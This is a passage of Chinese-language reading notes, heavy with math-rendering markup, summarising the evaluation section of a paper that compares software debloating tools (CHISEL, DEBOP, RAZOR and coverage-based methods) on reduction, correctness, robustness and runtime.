xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>𝐼</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">𝐼&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq></p></li></ul><h5 id="4.2.3-%E6%A0%A1%E9%AA%8C%E5%99%A8" tabindex="-1">4.2.3 校验器</h5><ul><li>我们使用校验器来评估程序的行为正确性和稳健性<ul><li>校验器比较 简化程序的输出和原始程序的输出</li><li>对于 实用程序,也要考虑程序的 退出值,打印的消息,所生成的文件;对于文件,会检查文件内容(必要时需要检查文件的权限)</li><li>对于SIR程序,使用其原始的对应的校验器;此外我们开发了一个校验器来评估鲁棒性</li><li>为了确定程序是否崩溃，oracle会检查一系列表示异常终止的退出代码</li></ul></li></ul><h4 id="4.3-%E9%85%8D%E7%BD%AE" tabindex="-1">4.3 配置</h4><h5 id="4.3.1-%E8%AF%84%E4%BC%B0%E6%96%B9%E6%B3%95" tabindex="-1">4.3.1 评估方法</h5><ul><li><p>对与每个实用程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>,获得10组输入,使用 去膨胀方法<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq>基于 输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>d</mi></msub></mrow><annotation encoding="application/x-tex">I_d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>生成 简化程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>测量这些程序的简化程度、通用性和权衡得分，并计算它们的平均值作为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>𝑇</mi></mrow><annotation encoding="application/x-tex">𝑇</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq>所实现的得分。</p><ul><li>为了衡量c-generality，我们对于每个未用于去冗余的输入集合（共九组），执行<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>𝑝</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">𝑝&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>，并计算<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>𝑝</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">𝑝&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>正确行为的输入比例的平均值</li></ul></li><li><p>对于每个SIR程序 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>,使用 去膨胀方法<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi></mrow><annotation encoding="application/x-tex">T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span></span></eq>基于 输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>d</mi></msub></mrow><annotation encoding="application/x-tex">I_d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>生成 简化程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>\</p><ul><li>基于测试输入<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mi>e</mi></msub></mrow><annotation encoding="application/x-tex">I_e</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>评估<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>的正确性</li><li>基于模糊测试输入和校验器<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>I</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">I&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>评估<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>p</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">p&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9463em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>的鲁棒性</li></ul></li></ul><h5 id="4.3.2-%E5%8F%82%E6%95%B0%E8%AE%BE%E7%BD%AE" tabindex="-1">4.3.2 参数设置</h5><ul><li>使用默认参数运行 CHISEL,DEBOP,RAZOR<ul><li>由于CHISEL和DEBOP运行时间长,设置时间上限6h</li><li>RAZOR在四个级别上进行增强并进行实验</li></ul></li><li>对于CovF,从输入集选择最多100个输入,使用Radamsa为每个选定的输入生成10模糊测试输入进行去膨胀</li><li>对于CovA,试验了15个K值,比较不同的结果</li><li>为了衡量通用性,我们设置了10s的超时,因为一个去膨胀程序对一个输入可能不会停止</li></ul><h5 id="4.3.3-%E5%B9%B3%E5%8F%B0" tabindex="-1">4.3.3 平台</h5><ul><li>Ubuntu-18.04机器上运行的260GB RAM和32 AMD-Opteron 1.4GHz处理器,该机器需要超过284小时(11天)才能完成所有实验的去膨胀工作</li></ul><h4 id="4.4-%E6%8E%A2%E7%A9%B6%E9%97%AE%E9%A2%98%E4%B8%80%3A%E7%AE%80%E5%8C%96%E5%BA%A6%2C%E6%AD%A3%E7%A1%AE%E6%80%A7%E5%92%8C%E6%9D%83%E8%A1%A1" tabindex="-1">4.4 探究问题一:简化度,正确性和权衡</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_1_2.png" alt></p><h5 id="4.4.1-chisel%E5%92%8Cdebop%2Ccov-%E6%AF%94%E8%BE%83" tabindex="-1">4.4.1 CHISEL和DEBOP,COV 比较</h5><ul><li>CHISEL和DEBOP的正确性较低,低于0.6,即这两种方法容易产生过拟合的程序</li><li>Tradeoff中,CHISEL和DEBOP的基于大小的F-score较低,即这两种方法在正确性和简化度的平衡不如Cov</li><li>原因:<ul><li><ol><li>CHISEL基于增量调试,在删除代码时非常激进.但其增量调试费时,所以在大型程序上CHISEL无法修建大量不需要的代码</li></ol></li><li><ol start="2"><li>DEBOP依赖随机优化,基于Cov的代码再进行删除,因此DEBOP不会增加COV的正确性,但可以提高简化度,所以DEBOP会生产高简化度和低正确性的程序</li></ol></li></ul></li><li>对于实用程序,CHISEL和DEBOP移除的ROP gadgets比Cov多,导致RelAF和AllAF分数略高.(ROP gadgets，全称Return Oriented Programming gadgets，指的是一段以汇编指令&quot;ret&quot;结尾的一小段指令序列。这些 gadgets 可以被用来修改某些地址的内容，从而有效地控制程序的执行流程。本文即指攻击面)<ul><li>原因:<ul><li><ol><li>DEBOP和CHISEL在执行路径中删除语句,可以有效减少ROP gadgets</li></ol></li><li><ol start="2"><li>DEBOP将ROP gadgets的减少列为目标之一</li></ol></li></ul></li><li>对于大程序,由于CHISEL费时,其减少攻击面的能力降低</li></ul></li></ul><h5 id="4.4.2-covf%2C-cova%2C-and-others-%E6%AF%94%E8%BE%83" tabindex="-1">4.4.2 CovF, CovA, and others 比较</h5><ul><li>CovF和CovA的正确性高于Cov,CovA尤其明显,且CovA时正确性最高的方法;CovF更专注于鲁棒性,所以正确性较低于CovA</li><li>CovF和CovA的简化程度小于Cov,但在4.5中可以看到这两个方法可以在不影响简化程度的情况下显著提高程序通用性</li><li>CovF和CovA的基于攻击面的F分数较低,因为方法基于Cov,无法有效减少攻击面;优化Cov以减少攻击面,这可能是未来的一个研究方向</li></ul><h5 id="4.4.3-razor%E5%92%8C%E5%9F%BA%E4%BA%8E%E6%BA%90%E4%BB%A3%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95%E6%AF%94%E8%BE%83" tabindex="-1">4.4.3 RAZOR和基于源代码的方法比较</h5><ul><li>RAZOR时基于二进制的方法,其获得了高简化和高正确的分数,即其在两个基准测试中的大小和攻击面的F分都是最高的,原因是<ul><li><ol><li>指令级别的操作</li></ol><ul><li>因此RAZOR的搜索空间比基于源代码的大,能找到更多更好的权衡空间.</li><li>同时因为RAZOR能够在指令级别上修改编译器带来的冗余代码,将其和基于源代码的方法相比可能不恰当.</li><li>为此我们使用RAZOR基于覆盖率的方法(称为RazorCov)生成没有增强的简化程序,发现通过修建指令生成的程序内存大小和攻击面都比Cov小,从而有更大的增强空间</li></ul></li><li><ol start="2"><li>使用增强来补充输入中未被测试到的代码</li></ol></li></ul></li></ul><h5 id="4.4.5-%E5%9C%A8%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%8A%E7%9A%84%E6%AF%94%E8%BE%83" tabindex="-1">4.4.5 在小程序上的比较</h5><ul><li>Cov没有达到高简化分数和高F分数,CovA和CovF简化分数提高但F分依然不高.这似乎意味着基于源代码的方法在小型程序上的效果不好</li><li>Chisel和Debop简化分数和F分数都很高,因为程序搜索空间小. Razor因为基于二进制,所以简化分数和F分数都很高</li></ul><h4 id="4.5-%E6%8E%A2%E7%A9%B6%E9%97%AE%E9%A2%98%E4%BA%8C%3A%E7%AE%80%E5%8C%96%E5%BA%A6%2C%E9%B2%81%E6%A3%92%E6%80%A7%E5%92%8C%E6%9D%83%E8%A1%A1" tabindex="-1">4.5 探究问题二:简化度,鲁棒性和权衡</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_1_3.png" alt></p><ul><li><p>上图第二列展示了所有方法的平均鲁棒性分数,这些分数基于Radamsa生成的模糊输入计算而成.同时表格显示了三种 简化分数和权衡分数</p></li><li><p>结论</p><ul><li>CovF实现了最高的鲁棒性,并且简化分数和Cov并没有差太多</li><li>基于输入的方法对于未观察到的输入鲁棒性都很低,因为其去冗余的输入只反映了程序的典型使用情况</li><li>Razor生成的简化程序鲁棒性最低,且RazorCov的鲁棒性更低,其对输入过拟合严重<ul><li>原因:大多数程序中,Razor的增强与稳定性无关,只会追求更好的简化程度,这会排除一些防御性检查,如printf和exit等,</li></ul></li></ul></li><li><p>还使用了AFL [4] 评估测试每种方法生成的简化程序的鲁棒性,结果显示CovF具有最高的r-generality（0.87），其次是Chisel，其r-generality为0.75，其他方法的得分均为0.67。CovF也是实现最高基于大小的权衡得分的方法：SF为0.76，MF为0.71。这些结果进一步证实了CovF的有效性。</p></li><li><p>还使用Radamsa生成的模糊输入对SSIR中的所有小程序进行了测试，并发现对于这些程序，所有方法都实现了较高的r-generality，其中CovF的得分最高（0.96），而Razor的得分最低（0.88）。与我们在第4.4.4节中展示的情况类似，CovF和CovA使用的基于源代码的增强策略在小程序中往往是无效的，因为这些程序只能进行有限的代码减少。</p></li></ul><h4 id="4.6-%E6%8E%A2%E7%A9%B6%E9%97%AE%E9%A2%98%E4%B8%89%3A%E5%BD%93%E4%BD%BF%E7%94%A8%E8%B6%8A%E6%9D%A5%E8%B6%8A%E5%A4%9A%E7%9A%84%E8%BE%93%E5%85%A5%E8%BF%9B%E8%A1%8C%E7%B2%BE%E7%AE%80%E6%97%B6%EF%BC%8C%E6%89%80%E8%80%83%E8%99%91%E7%9A%84%E6%96%B9%E6%B3%95%E7%9A%84%E8%A1%A8%E7%8E%B0" tabindex="-1">4.6 探究问题三:当使用越来越多的输入进行精简时，所考虑的方法的表现</h4><ul><li>实验不同数量的输入时不同的简化方法的表现</li><li>使用SIR基准进行了这个实验,因为其有大量的测试集</li><li>对每个程序<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span></eq>,创建三个输入集<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>I</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>I</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">I_1,I_2,I_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mn>0</mn></msub><mo>⊂</mo><msub><mi>I</mi><mn>1</mn></msub><mo>⊂</mo><msub><mi>I</mi><mn>2</mn></msub><mo>⊂</mo><msub><mi>I</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">I_0\subset I_1 \subset I_2 \subset I_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">⊂</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>,并且<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>I</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>I</mi><mn>3</mn></msub></mrow><annotation encoding="application/x-tex">I_1,I_2,I_3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>的大小分别为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi></mrow><annotation encoding="application/x-tex">I</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span></span></span></span></eq>的<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mi mathvariant="normal">%</mi><mo separator="true">,</mo><mn>20</mn><mi mathvariant="normal">%</mi><mo separator="true">,</mo><mn>30</mn><mi mathvariant="normal">%</mi></mrow><annotation encoding="application/x-tex">10\%,20\%,30\%</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9444em;vertical-align:-0.1944em;"></span><span class="mord">10%</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">20%</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">30%</span></span></span></span></eq>,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>I</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">I_0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></eq>是之前实验的10个输入集;使用这些输入集进行去膨胀,用剩下的输入集进行正确性评估,使用Radamsa生成的模糊输入进行鲁棒性评估</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(1)_1_4.png" alt></p><ul><li>上图展示了不同方法在减少（mred和aread）、通用性（allcgen, relcgen, 和 rgen）以及权衡（从mf-allcgen到af-rgen）方面的平均得分</li><li>结论<ul><li>当输入规模增大,简化分数会降低,但正确性会提高</li><li>当输入规模增大,鲁棒性不会显著提升,同时由于鲁棒性的增加少于代码的增加,对应的F分可能会下降</li></ul></li></ul><h4 id="4.7-%E6%8E%A2%E7%A9%B6%E9%97%AE%E9%A2%98%E5%9B%9B%3A%E8%BF%99%E4%BA%9B%E6%96%B9%E6%B3%95%E7%9A%84%E6%95%88%E7%8E%87" tabindex="-1">4.7 探究问题四:这些方法的效率</h4><ul><li>Chisel和Debop最耗时,平均需要4.7小时和5.4小时来生成一个去臃肿的程序</li><li>Razor、Cov和CovA的效率更高，平均只需要0.2分钟、0.4分钟和0.6分钟来生成一个去臃肿的程序。</li><li>因为基于覆盖的方法不需要像Chisel和Debop那样反复执行相同的输入</li><li>此外,增强过程也是高效的,除CovF需要模糊测试外,但也只要3.3分钟</li></ul><h4 id="4.8-%E8%AE%A8%E8%AE%BA" tabindex="-1">4.8 